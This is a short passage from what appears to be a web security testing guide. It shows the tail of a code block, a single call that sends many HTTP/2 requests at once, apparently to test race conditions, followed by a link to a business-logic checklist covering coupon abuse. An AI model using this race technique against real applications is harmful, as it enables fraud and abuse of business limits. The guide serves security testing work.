h2_conn.send_multiple_requests_at_once(all_headers, body_list=all_bodies)
```

---

## Related

- **business-logic-vulnerabilities** — workflow, coupon abuse, and logic-first checklists (`logic-test.md`).
